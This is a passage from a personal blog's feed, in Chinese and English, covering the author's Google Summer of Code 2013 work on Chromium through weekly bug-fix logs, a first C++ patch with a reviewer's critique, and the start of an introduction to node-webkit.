Proposal也扩展成了现在这个样子，能够让chrome.commands支持多媒体键。虽然这个Proposal在最近才有代码上的进展，对于我自己来说，能够参与到这样子的一个过程，看着自己的想法正在一步步地实现中，有点小骄傲的说！！</p><p>关于这个功能的具体实现过程，有我在linux平台上的实现哦，有兴趣浏览一下代码的可以看看<a href="https://code.google.com/p/chromium/issues/detail?id=302437" target="_blank" rel="noopener">这里</a>. 希望这个功能能够早点被大家所用啊！！</p><h3 id="我学到了什么呢？"><a href="#我学到了什么呢？" class="headerlink" title="我学到了什么呢？"></a>我学到了什么呢？</h3><p>我觉得很多人都会不知道我上面那一段是在胡扯些什么。算了，不详细介绍上面的细节，要证明能参加GSoC的学生还是有点料的。</p><p>在前一段时间GSoC 2013就不知不觉地结束了，也就在这个时候，我意识到了这么有意义的三个月就Over了。打从心里觉得我提交了的代码根本不值那5000美刀，相反地，是Google给我了这些钱，让我去学习。Google给我机会去参与到真实的软件开发过程中。每次想到自己的代码能够通过Chrome这个产品被全世界那么多人使用到，觉得自己花了那么大的精力也值得啊。</p><p>哦，好像忘记了什么？在这个过程中，我觉得我的C++水平提高很多，这样子的实践机会比起学院里的那些作业来得有效多了。在这个过程中，我好像学了些HTML/CSS/JavaScript。在这个过程中，我掌握了一些Win32下的API。在这个过程中，我学习了GTK+，X11等，虽然没有深入学习，但会用。我还知道了很多在学校里学不到的东西，比如老师会告诉你测试很重要，但却不会提供给你机会去实践在一个具体问题下应该怎么设计来得合理。又比如老师会跟你讲设计模式多么多么重要，但却又不会给你实际的应用机会，有的只是类似于《大话设计模式》那本书上的例子。再比如老师会跟你讲语言的知识点，但却很少跟你强调代码风格的重要性，等等。</p><p>如果有一天，毕业论文能够变成：你在某个被大家所认可的开源社区中做出多少贡献。</p><p>最后，我也不说开源怎么怎么了，推荐阅读两篇文章：<a href="https://github.com/lifesinger/lifesinger.github.com/issues/167" target="_blank" rel="noopener">什么是开源精神</a> 和<a href="http://cubiq.org/open-source-made-me-the-man-i-am" target="_blank" rel="noopener">OPEN SOURCE MADE ME THE MAN I AM</a>。</p><p>Updates: 我觉得我应该感谢当时给我机会实习的Intel OTC以及那里的人！！在那里我开始了解各种开源协议（我还记得当时给我们讲课的可是英特尔首席开源科学家Fleming），听到各种高端的分享（印象最深的是一位韩国的工程师，Firefox的Developer），等等！！没有这些，我估计也没有什么机会参加上这种活动。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;p&gt;今天早上才想起来，自己还欠着一件事情没有做完。很久在人人上之前看到过这样的一句话：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I droppe
      
    
    </summary>
    
    
      <category term="OpenSource" scheme="http://zhchbin.github.io/tags/OpenSource/"/>
    
  </entry>
  
  <entry>
    <title>Record Of My GSoC 2013</title>
    <link href="http://zhchbin.github.io/2013/05/30/recordofmygsoc2013/"/>
    <id>http://zhchbin.github.io/2013/05/30/recordofmygsoc2013/</id>
    <published>2013-05-29T16:00:00.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="About"><a href="#About" class="headerlink" title="About"></a>About</h4><p>This is used to record my status and updates while fighting for GSoC 2013 weekly. Being the lucky dog that can take part in GSoC is the most wonderful moment in my life recently. The open source project I applied to is chromium, which is a monolithic application. <strong>Cause my English is poor, there will be many stupid grammar mistakes in this post. Sorry for it.</strong></p><h4 id="Week-00"><a href="#Week-00" class="headerlink" title="Week 00"></a>Week 00</h4><ol><li>Successfully be admitted. I was very thrilled when I got the congratulation email at about 03:00 am.</li><li>Finish the ToDo list: Enrollment Form and Tax Form.</li><li>Prepare for the implementation of my <a href="http://www.google-melange.com/gsoc/project/google/gsoc2013/zhchbin/6001" target="_blank" rel="noopener">proposal</a>, such as reading the code about chrome.command, which will be a good example for me.</li></ol><h4 id="Week-01"><a href="#Week-01" class="headerlink" title="Week 01"></a>Week 01</h4><ol><li>Commit a fix for content shell on windows: Enable visual styles via adding shell.exe.manifest. <a href="https://chromiumcodereview.appspot.com/15649020" target="_blank" rel="noopener">Review URL</a>. This help me understand how to commit to the source tree successfully.</li><li>Writing New API Proposal as my mentor recommend.</li><li>Worry about my project because I didn’t hear anything from my mentor after I was selected even though I email him twice.</li></ol><h4 id="Week-02-03"><a href="#Week-02-03" class="headerlink" title="Week 02~03"></a>Week 02~03</h4><ol><li>The Dragon Boat Festival, at home. Looking into several issues and try to fix them for warm-up.</li><li>Working for the patch which can help the app window fit on screen when the screen layout changed. <a href="https://codereview.chromium.org/17378003/" target="_blank" rel="noopener">Code Review Url 17378003</a></li></ol><h4 id="Week-04"><a href="#Week-04" class="headerlink" title="Week 04"></a>Week 04</h4><ol><li>Update my proposal and send it to be reviewed.</li><li>Fix several trivial bugs. The previous patch 17378003 landed with the help of scheib. <a href="https://chromiumcodereview.appspot.com/17564005/" target="_blank" rel="noopener">Code Review Url 17564005</a></li></ol><h4 id="Week-05-07"><a href="#Week-05-07" class="headerlink" title="Week 05~07"></a>Week 05~07</h4><ol><li>Investigate workarounds for missing minimize event in Ubuntu’s unity window manager. <a href="https://codereview.chromium.org/18741006/" target="_blank" rel="noopener">Code Review URL 18741006</a>. In the unity window manager in ubuntu, when you minimize a window it doesn’t let the application know via the normal GTK API’s. In this patch, it will use XEvent to catch the PropertyNotify event and check <code>_NET_WM_STATE</code> of the window to determine whether the state of the window is minimized.</li><li>Fix a memory link within the patch for “Links in platform apps should open in the system default browser”. I find out when adding a test case for <code>ShellWindowLinkDelegate::OpenURLFromTab</code>. My patch used <code>scoped_ptr</code> to manage the ShellWindowLinkDelegate. <a href="https://codereview.chromium.org/18051015/" target="_blank" rel="noopener">Code Review URL 18051015</a>.</li><li>Try to add a test case for <code>ShellWindowLinkDelegate::OpenURLFromTab</code>. However, the codereview is pending and waiting for reply. While developing this patch, I learn something about ASAN of chromium and find out the root cause of <a href="https://chromiumcodereview.appspot.com/10915047#msg27" target="_blank" rel="noopener">ASAN use-after-free errors</a>. You can find it within my comments: <a href="https://codereview.chromium.org/18192003/" target="_blank" rel="noopener">Code Review URL 18192003</a>.</li><li>Add code to clear existing alarms when uninstalling extension. I fixed it after one hour the bug was reported. <a href="https://codereview.chromium.org/18713004/" target="_blank" rel="noopener">Code Review URL 18713004</a>.</li><li>Help to fix a Pri-1 issue: <a href="https://code.google.com/p/chromium/issues/detail?id=257273" target="_blank" rel="noopener">Apps on NTP cannot be dragged</a>. My revision “209944” is suspected to cause this issue. However, the revision will only influence code in the windows platform and shouldn’t be relevant to. In order to prove it, I did some detective work to find out which revision introduced this bug. My work was praised in the <a href="https://code.google.com/p/chromium/issues/detail?id=257273#c10" target="_blank" rel="noopener">comment#10</a>.</li><li>Help to narrow down cause of issue: ‘App APIs REPL’ app crashes. The crash is caused by incomplete API removal of managedModePrivate. <a href="https://code.google.com/p/chromium/issues/detail?id=256981#c2" target="_blank" rel="noopener">My Comment</a>.</li><li>There are also several trivial commits that I have landed. For example, dragging the icon of the app out of the app launcher when its downloading is in process would crash Chrome. <a href="https://chromiumcodereview.appspot.com/18153015" target="_blank" rel="noopener">Review URL</a> fix this problem.</li><li>Report some bugs that I have found: (1) <a href="http://crbug.com/257750" target="_blank" rel="noopener">Issue 257750</a>, Continue Reload of chrome://extensions will break it. (2) <a href="http://crbug.com/252663" target="_blank" rel="noopener">Issue 252663</a>, Using the Apps Developer Tool, restart the disabled unpacked platform app will crash chrome. I fixed it also. </li></ol><h4 id="Week-08"><a href="#Week-08" class="headerlink" title="Week 08"></a>Week 08</h4><ol><li>Begin to work on media keys support via extending chrome.commands. My proposal is adding an attribution <code>enable_media_keys</code> and some build-in commands into chrome.commands. For more detail, please refer to the <a href="https://code.google.com/p/chromium/issues/detail?id=131612#c14" target="_blank" rel="noopener">comment</a> I post on the <a href="http://crbug.com/131612" target="_blank" rel="noopener">http://crbug.com/131612</a>. And I also wrote down the <a href="https://docs.google.com/document/d/1t1s7RD3Nh_5TX6r7bwf-_QGkGTNXb3-IoGmDbDsmqsQ/edit?usp=sharing" target="_blank" rel="noopener">problem</a> that I have met.</li><li>Finish issue 18741006: [GTK] Report isMinimized and correctly restore app windows. I ignored to check <code>_NET_SUPPORTED</code> first of all to determine whether the absence of <code>_NET_WM_STATE_HIDDEN</code> infers that the window is not iconified. Thanks for the help from all the reviewers. <a href="https://codereview.chromium.org/18741006" target="_blank" rel="noopener">Code Review URL 18741006</a>.</li></ol><h4 id="Week-09"><a href="#Week-09" class="headerlink" title="Week 09"></a>Week 09</h4><ol><li><a href="https://code.google.com/p/chromium/issues/detail?id=263968" target="_blank" rel="noopener">Issue 263968</a>: Packing extension with bad private key causes crash. It is caused by the code ignored a sign zip error. <a href="https://codereview.chromium.org/20142007/" target="_blank" rel="noopener">Code Review URL 20142007</a>. However, it got an not lgtm because Daniel Nishi has another patch out.</li><li><a href="https://code.google.com/p/chromium/issues/detail?id=264645" target="_blank" rel="noopener">Issue 264645</a>: Icons for the apps are flickering while launching. Because when launching the apps, the unpacked icon url will be changed due to <a href="https://src.chromium.org/viewvc/chrome?revision=209895&amp;view=revision" target="_blank" rel="noopener">r209895</a>. The revision is to fix a bug where extension’s icon was not updated on reload. So it used an Date.now() to prevent the cache of image. My <a href="https://codereview.chromium.org/20728002/" target="_blank" rel="noopener">Code Review URL 20728002</a> is on the way.</li><li><a href="https://code.google.com/p/chromium/issues/detail?id=264624" target="_blank" rel="noopener">Issue 264624</a>: App APIs REPL app Crashes while launching. This is a regression issue. The root cause is an incomplete API removal: pageLauncher in the <code>_api_features.json</code>. <a href="https://codereview.chromium.org/21028005/" target="_blank" rel="noopener">Code Review URL 21028005</a> remove remaining code related to pageLauncher, and add a test case to prevent future incomplete API removals in the <code>_api_features.json</code>. Still on the way. </li><li><a href="https://code.google.com/p/chromium/issues/detail?id=261996" target="_blank" rel="noopener">Issue 261996</a>: Chevron icon (&gt;&gt;) appears in the browser action area for one extension. In the function BrowserActionsContainer::BrowserActionAdded of <code>chrome/browser/ui/views/browser_actions_container.cc</code>, if the extension is marked as upgrading, it will stop enlarge the container if it was already at maximum size. The upgrading extension didn’t remove the browser action, so it works correctly. However, when a extension is crashed (The browser action will be removed if it has) and reloaded (will add the browser action icon back if it has), it shouldn’t be marked as upgrading. The bug is introduced by <a href="http://src.chromium.org/viewvc/chrome?revision=196634&amp;view=revision" target="_blank" rel="noopener">r196634</a>. <a href="https://codereview.chromium.org/20909002/" target="_blank" rel="noopener">Code Review URL 20909002</a> still being reviewed.</li></ol><h4 id="Week-10"><a href="#Week-10" class="headerlink" title="Week 10"></a>Week 10</h4><ol><li>Finish the CLs I submitted last week as reviewers’ comments.</li><li>Investigate and follow up <a href="https://code.google.com/p/chromium/issues/detail?id=265798" target="_blank" rel="noopener">Issue 265798</a>: Unable to add extension from webstore. It looks like a regression because after the <a href="http://src.chromium.org/viewvc/chrome?revision=213568&amp;view=revision" target="_blank" rel="noopener">r213568</a>, Chrome will load icon =&gt; “64” field, before it chrome only load: 16, 48, 128, and the field of “64” is ignored, so it works OK in the previous version.</li><li>Report a weird <a href="https://code.google.com/p/chromium/issues/detail?id=266891" target="_blank" rel="noopener">issue</a>: Browser action container shrink and only chevron icon is shown when “ExtensionToolbarModel::OnExtensionToolbarPrefChange” is called. Spend my time on finding the way to reproduce the problem reliably. But it seems to happen only in my computer at last.</li></ol><h4 id="Week-11"><a href="#Week-11" class="headerlink" title="Week 11"></a>Week 11</h4><p>Last week I went back home to take a break, but I still keep my eyes on several issues.</p><ol><li><a href="https://code.google.com/p/chromium/issues/detail?id=267187" target="_blank" rel="noopener">Issue 267187</a>: Apps Developer Tool, Installation warnings are not shown properly. This is easy to fix because the Apps Developer Tool should keep consistence with the <code>chrome://extensions</code>, so I use the same appearance as the page. <a href="https://chromiumcodereview.appspot.com/22191003" target="_blank" rel="noopener">Code Review URL 22191003</a>.</li><li><a href="https://code.google.com/p/chromium/issues/detail?id=257474" target="_blank" rel="noopener">Issue 257474</a>: Firefox bookmarks file with <code>&lt;HR&gt;</code> tags and folders doesn’t import correctly. This is a Hotlist-GoodFirstBug. Because the HTML file exported from Firefox will contain <code>&lt;HR&gt;</code> tags, which is the bookmark entries separator in Firefox that Chrome does not support. Note that there can be multiple <code>&lt;HR&gt;</code> tags at the beginning of a single line. My fix is simply skipping over the tags. And by the way, as the suggestion of @gab, I refactor the <code>bookmark_html_reader_unittest</code> to avoid repeating the initialization code that all of these tests have in common. <a href="https://chromiumcodereview.appspot.com/22408007" target="_blank" rel="noopener">Code Review URL 22408007</a>.</li></ol><h4 id="Week-12"><a href="#Week-12" class="headerlink" title="Week 12"></a>Week 12</h4><p>This week I have to check in and take a medical examination because our school started. It’s a waste of time and energy.</p><ol><li>The first issue I working on this week is <a href="https://code.google.com/p/chromium/issues/detail?id=269450" target="_blank" rel="noopener">Issue 269450</a>: Extensions page is scrolling down and up while scrolling on the “keyboard shotcuts” page. Thanks for the help from @xiyuan and @miket first of all. My first patch is using a css style “no-scroll” to remove the scrollability of page when showing the overlay. However, the page will change when the scrollbar disappears/shows. The problem is more apparent when the browser window is not wide enough. Finally, with @xiyuan’s instruction, we fixed it with following <a href="https://chromiumcodereview.appspot.com/22661007" target="_blank" rel="noopener">CL</a>. The pacth also expose a <a href="https://code.google.com/p/chromium/issues/detail?id=276043" target="_blank" rel="noopener">Blink bug</a> luckily.</li><li>Pick up <a href="https://code.google.com/p/chromium/issues/detail?id=131612" target="_blank" rel="noopener">Issue 131612</a>: Multimedia keys API support. And ask for @finnur and @mek for suggestion. Now I have known how to continue my proposal clearly.</li></ol><h4 id="Week-13"><a href="#Week-13" class="headerlink" title="Week 13"></a>Week 13</h4><ol><li><a href="https://code.google.com/p/chromium/issues/detail?id=270844" target="_blank" rel="noopener">Issue 270844</a>: GTalk pinned to Taskbar: Chrome window opens instead of GTalk window. When panel widnow is pinned to the taskbar, the relaunch behavior is weird to the user. Panel windows are created and used by the extensions. When they are pinned to the taskbar, the icon will change to Chrome instead of the original icon. What’s more, the relaunch behavior (Close all panel windows and then click the pinned icon will open a chrome new window) will confuse the user. Why we can’t implement the support to pin the panel window on the taskbar? It is because launching chrome executable with extension id (in this case, hangout id), will launch chrome browser with Hangout options page, instead of the chat window. The <a href="https://codereview.chromium.org/23146009/" target="_blank" rel="noopener">Code Review URL 23146009</a>: Remove “Pin this program to taskbar” of panel window. Use <code>SHGetPropertyStoreForWindow</code> to remove it.</li><li><a href="https://codereview.chromium.org/22859067/" target="_blank" rel="noopener">Code Review URL 22859067</a>: Revert r217952 to make behavior of horizontal scroll bar in page <code>chrome://extensions</code> keep consistence with <code>chrome://settings</code>. My <code>r217952</code> has side effect, <a href="https://code.google.com/p/chromium/issues/detail?id=277974" target="_blank" rel="noopener">Issue 277974</a>: Horizontal scroll bar issue for <code>chrome://extensions/</code> page. So I revert it and use my original patch to deal with the <a href="https://code.google.com/p/chromium/issues/detail?id=269450" target="_blank" rel="noopener">http://crbug.com/269450</a>.</li><li><a href="https://codereview.chromium.org/22801019/" target="_blank" rel="noopener">Code Review URL 22801019</a>: Provide i18n support for descriptions in commands API.</li><li><a href="https://codereview.chromium.org/23290007/" target="_blank" rel="noopener">Code Review URL 23290007</a>: Fix nit of chrome.commands doc: invalid json format. </li></ol><h4 id="Week-14"><a href="#Week-14" class="headerlink" title="Week 14"></a>Week 14</h4><ol><li><a href="https://code.google.com/p/chromium/issues/detail?id=131612" target="_blank" rel="noopener">Issue 131612</a>: Multimedia keys API support. I focused on this issue this week. My CL has committed. It will allow the user to use the media keys: MediaNextTrack’, ‘MediaPrevTrack’, ‘MediaStop’, ‘MediaPlayPause’ with named command. <a href="https://codereview.chromium.org/23445013/" target="_blank" rel="noopener">Code Review URL 23445013</a>: Parse media keys for named command in the manifest.</li><li><a href="https://codereview.chromium.org/23486008/" target="_blank" rel="noopener">Code Review URL 23486008</a>: Fix wrong description of chrome.commands example.</li></ol><h4 id="Week-15"><a href="#Week-15" class="headerlink" title="Week 15"></a>Week 15</h4><p>I’m almost crazy this week due to heavy homework. I worked on serveral issues but got nothing. Sorry for it.</p><ol><li><a href="https://code.google.com/p/chromium/issues/detail?id=242790" target="_blank" rel="noopener">Issue 242790</a>: App windows with ids should remember fullscreen state. It can be fixed easilly on windows and linux platform just adding trivial change to the <code>native_app_window_views.cc</code> etc. Sadly, it’s reverted. The reason for revert: Causes PlatformAppBrowserTest.ShellWindowRestoreState to fail on Mac OS X 10.6. But I didn’t have OS X 10.6 for testing. Note: it can pass try job: <code>mac_rel</code>. Though the issue didn’t being fixed successfully, I also found a bug: <a href="https://code.google.com/p/chromium/issues/detail?id=287596" target="_blank" rel="noopener">Issue 287596</a>: App Window return false of isFullscreen when initially created with {state: “fullscreen”}.</li><li><a href="https://code.google.com/p/chromium/issues/detail?id=259040" target="_blank" rel="noopener">Issue 259040</a>: Extensions with very long names push dialog off screen. I proposal to show the whole name with adding a line of code on <code>views</code> platform. Also looking into how it can be done on <code>gtk</code>. But I didn’t have enough time to finish it.</li><li>Help triage <a href="https://code.google.com/p/chromium/issues/detail?id=288625#c3" target="_blank" rel="noopener">Issue 288625</a> to the right person.</li></ol><h4 id="From-16th-Week…"><a href="#From-16th-Week…" class="headerlink" title="From 16th Week…"></a>From 16th Week…</h4><p>In this period I was working with @Finnur to implement first part of supporting global extension commands. As my proposal, chrome will read an optional “global” flag from the manifest and register the shortcuts as global if it is set to true. Now the <a href="https://codereview.chromium.org/23812010/" target="_blank" rel="noopener">CL</a> had got <code>LGTMs</code> from the reviewers and waiting for committing to the source tree. And I will continue to do a followup CL after @Finnur’s stuff in.</p><p>In the meantime, I passed the final evaluation successfully. I owe great thanks to my mentor Marijn, the excellent software engineers from Google, especially the reviewers (@kalman, @finnur, @scheib, @Daniel Nishi, @miket etc) who had taught me a lot that I will not learn in school. Finnally, great thanks to Google.</p><h4 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h4><p>From Google Open Source Blog, <a href="http://google-opensource.blogspot.com/2013/10/9th-year-of-google-summer-of-code-draws.html" target="_blank" rel="noopener">9th Year of Google Summer of Code draws to a close</a></p><p>The end of summer in the Northern Hemisphere also signals the end of the 2013 Google Summer of Code, our program designed to introduce university students from around the world to open source development.</p><p>In June, 1,192 university students from 69 countries began writing code for 177 open source organizations with the help of 2,218 mentors from 71 countries – quite the team effort! We are excited to announce that 88.6%* (1056) of the students passed their final evaluations. If you would like to read about more numbers on the Google Summer of Code program you can view a variety of statistics on the previous eight years of the program.</p><p>Stay tuned to this blog each Friday until the end of the year for wrap up posts from many of this year’s Mentoring organizations.</p><p>Now that the program has concluded, the students are busy preparing their code samples for all eyes to see. Soon you will be able to go to the program site where organizations will have links to the student’s code repositories.</p><p>Thank you to all of the students, mentors and organization administrators that have helped to make this 9th year of the Google Summer of Code a great success!</p><p>By Carol Smith, Open Source Programs</p><h4 id="It’s-not-the-End"><a href="#It’s-not-the-End" class="headerlink" title="It’s not the End."></a>It’s not the End.</h4>]]></content>
    
    <summary type="html">
    
      I will record my status every week within GSoC 2013.
    
    </summary>
    
    
      <category term="OpenSource" scheme="http://zhchbin.github.io/tags/OpenSource/"/>
    
  </entry>
  
  <entry>
    <title>First attempt to fix a bug of chromium</title>
    <link href="http://zhchbin.github.io/2013/04/25/first-attempt-to-fix-a-bug-of-chromium/"/>
    <id>http://zhchbin.github.io/2013/04/25/first-attempt-to-fix-a-bug-of-chromium/</id>
    <published>2013-04-24T16:00:00.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h3><p>Recently I spent most of my time in fixing a tricky <a href="http://crbug.com/148463" target="_blank" rel="noopener">bug</a> of chromium. By now, my patch is still in my local repo though it seems to solve the problem. This post is to record what I have learned from my failed attempt.</p><h3 id="Detail"><a href="#Detail" class="headerlink" title="Detail"></a>Detail</h3><p>Issue title: Report an error when chrome.app.window.create is called with a URL that does not exist.</p><p>In the background js of chrome packaged app, the app developer can pass a url to the api of creating a window. Currently this api will try to load the url in spite of the existence of the file. So the purpose of this issue is to add some code which can check the existence of the url, if it can’t be loaded, report an error. For example, in the following javascript code, the <code>aoeuaoeu.html</code> doesn’t exist, an error should be reported.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chrome.app.runtime.onLaunched.addListener(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> chrome.app.window.create(<span class="string">'aoeuaoeu.html'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>OK……It can to be done easily just adding serveral lines of code before the window is shown at my first sight. So after one afternoon, I finish it with the following patch.</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/chrome/browser/extensions/api/app_window/app_window_api.cc b/chrome/browser/extensions/api/app_window/app_window_api.cc</span><br><span class="line">index 1f726db..b838cb8 100644</span><br><span class="line"><span class="comment">--- a/chrome/browser/extensions/api/app_window/app_window_api.cc</span></span><br><span class="line"><span class="comment">+++ b/chrome/browser/extensions/api/app_window/app_window_api.cc</span></span><br><span class="line"><span class="meta">@@ -5,6 +5,8 @@</span></span><br><span class="line"> #include "chrome/browser/extensions/api/app_window/app_window_api.h"</span><br><span class="line"> </span><br><span class="line"> #include "base/command_line.h"</span><br><span class="line"><span class="addition">+#include "base/file_util.h"</span></span><br><span class="line"><span class="addition">+#include "base/stringprintf.h"</span></span><br><span class="line"> #include "base/time.h"</span><br><span class="line"> #include "base/values.h"</span><br><span class="line"> #include "chrome/browser/app_mode/app_mode_utils.h"</span><br><span class="line">@@ -32,6 +34,8 @@ namespace extensions &#123;</span><br><span class="line"> namespace app_window_constants &#123;</span><br><span class="line"> const char kInvalidWindowId[] =</span><br><span class="line">     "The window id can not be more than 256 characters long.";</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+const char kInvalidURL[] = "Could not load invalid url '%s'.";</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> const char kNoneFrameOption[] = "none";</span><br><span class="line">@@ -86,12 +90,27 @@ bool AppWindowCreateFunction::RunImpl() &#123;</span><br><span class="line">   EXTENSION_FUNCTION_VALIDATE(params.get());</span><br><span class="line"> </span><br><span class="line">   GURL url = GetExtension()-&gt;GetResourceURL(params-&gt;url);</span><br><span class="line"><span class="addition">+  bool is_component_app_and_has_scheme = false;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   // Allow absolute URLs for component apps, otherwise prepend the extension</span><br><span class="line">   // path.</span><br><span class="line">   if (GetExtension()-&gt;location() == extensions::Manifest::COMPONENT) &#123;</span><br><span class="line">     GURL absolute = GURL(params-&gt;url);</span><br><span class="line"><span class="deletion">-    if (absolute.has_scheme())</span></span><br><span class="line"><span class="addition">+    if (absolute.has_scheme()) &#123;</span></span><br><span class="line">       url = absolute;</span><br><span class="line"><span class="addition">+      is_component_app_and_has_scheme = true;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // Do not check the absolute URLs for component apps.</span></span><br><span class="line"><span class="addition">+  if (!is_component_app_and_has_scheme) &#123;</span></span><br><span class="line"><span class="addition">+    base::ThreadRestrictions::ScopedAllowIO allow_io;</span></span><br><span class="line"><span class="addition">+    if (!file_util::PathExists(</span></span><br><span class="line"><span class="addition">+            GetExtension()-&gt;GetResource(params-&gt;url).GetFilePath())) &#123;</span></span><br><span class="line"><span class="addition">+      error_ = base::StringPrintf(app_window_constants::kInvalidURL,</span></span><br><span class="line"><span class="addition">+                                  url.spec().c_str());</span></span><br><span class="line"><span class="addition">+      return false;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   bool inject_html_titlebar = false;</span><br><span class="line"><span class="deletion">--</span></span><br></pre></td></tr></table></figure><p>All of my change is only located in <code>app_window_api.cc</code>, the implementation of <code>chrome.app.window.create</code>. This api is working in the UI thread, so IO should be allowed in order to check the file existence using <code>file_util::PathExists</code>. I was very happy when I finished this patch. Everything seems to work well, once the file doesn’t exist, an error message will report in the console. Then I just begin to upload this to review. But I couldn’t do that because my code didn’t pass presubmit check. What? The reason I can get is</p><blockquote><p>New code should not use ScopedAllowIO. Post a task to the blocking pool or the FILE thread insead.</p></blockquote><p>Suddenlly I didn’t know how to solve this problem, though the message give me a direction. Then I email one of the engineers of the chromium who is the owner of this issue that <code>git cl upload</code> suggested. My mail contont is</p><blockquote><p>Sorry for disturb first. I am a student who want to contribute code to chromium. The first issue I choose is the <a href="http://crbug.com/148463" target="_blank" rel="noopener">http://crbug.com/148463</a>. In the patch I need to check whether a FilePath exists sync? This will not block the UI thread as far as I can see(Maybe I am wrong? I’m just an newbie), so I use ScopedAllowIO here. In the attach files is my stupid patch, any suggestion?</p></blockquote><p>He is a very nice man and give me kindly reply.</p><blockquote><p>Checking whether a FilePath exists is definitely a blocking I/O operation, and must not be done on the UI thread. For example, if that part of the file system is not cached in RAM, it might be the case that the disk will have to:</p><p>(1) spin up from standing, if it wasn’t already spinning,</p><p>(2) seek to one or more file system tables on the disk, and</p><p>(3) read them out.</p><p>That could actually take a really long time (up to several hundred milliseconds), during which time no other code would be able to run on the UI thread! That’s totally unacceptable :)</p><p>In addition, your patch has a couple other issues:</p><p>(1) there’s a race condition – it’s possible that, between when you check for the existence of the file and when it is loaded in the web view, the file is removed, and</p><p>(2) the mere existence of a path is insufficient to determine whether it can successfully be loaded: it could be non-readable by the user, or it could be a broken symlink, or it could be a folder.</p><p>Good luck! You picked a slightly tricky bug :)</p></blockquote><p>This does really teach me a lot!! Things become more interesting for me now!</p>]]></content>
    
    <summary type="html">
    
      Share my first failed experience about code contribution to chromium.
    
    </summary>
    
      <category term="Coding" scheme="http://zhchbin.github.io/categories/Coding/"/>
    
    
      <category term="OpenSource" scheme="http://zhchbin.github.io/tags/OpenSource/"/>
    
      <category term="C++" scheme="http://zhchbin.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>node-webkit系列（00）：什么是node-webkit？</title>
    <link href="http://zhchbin.github.io/2013/01/24/node-webkit/"/>
    <id>http://zhchbin.github.io/2013/01/24/node-webkit/</id>
    <published>2013-01-23T16:00:00.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>这两个月来接触到一个开源项目：node-webkit（项目地址：<a href="https://github.com/rogerwang/node-webkit" target="_blank" rel="noopener">Link</a>），也做了一点点小小的CodeContribution。打算开始写一些文章，介绍一下这个开源项目，以及相关的技术细节实现。这是第0篇，就先作为一个简要的介绍吧。</p><p>###是什么？</p><p>node-webkit是一个基于chromium和node.js实现的应用程序运行时环境，也即是说我们可以通过HTML，CSS，JavaScript实现一个本地化的应用程序。整个项目最具创意的部分就是将node.js整合进来，使得应用开发者能够直接在DOM里使用node.js模块，大大增强了Web端JavaScript的能力。该项目是由Intel开源项目中心开发与维护的。</p><p>###架构概览</p><p>目前node-webkit是基于chrome content api实现的，架构图如下：  </p><p><img src="/images/arch.png" alt="Arch">  </p><p>如果熟悉chrome这个浏览器架构的人一眼就可以看出来，node-webkit所处的层次与chrome是一致的，换句话说：node-webkit就是一个功能极简的web浏览器，它可以用来加载网页，执行JS脚本，不论是本地的html文件还是服务器端的文件。</p><ul><li>至于什么是chrome content api呢？该模块的主要功能是采用多进程（包含Browser进程，Render进程以及GPU进程）的模型渲染一个页面。它包含了几乎所有的HTML5的特性以及GPU加速渲染。该模块的目的就是让想在应用程序中嵌入浏览器模块，但又不想包含全部浏览器所有功能的开发者使用的。</li><li>为什么要采用chrome content api而不是其他？<blockquote><ul><li>Content API提供了公开且稳定的接口，且相对于CEF3更加灵活。CEF3也是基于Content API实现的一个可以将渲染网页的功能嵌入到应用程序之中的框架，虽然其接口经过封装后使用起来相比比较简单和方便，但是当需要使用到Content API的很多功能时候，CEF3的接口可能做不到。</li><li>V8引擎的高效。众所周知，V8引擎对于Javascript这门语言的重要性，chrome浏览器的成功也得益于其执行Javascript的快速！而对于node-webkit，作为一个本地化的应用程序运行环境，javascript代码执行的效率也是至关重要的，使得应用程序与用户之间的交互更接近Native 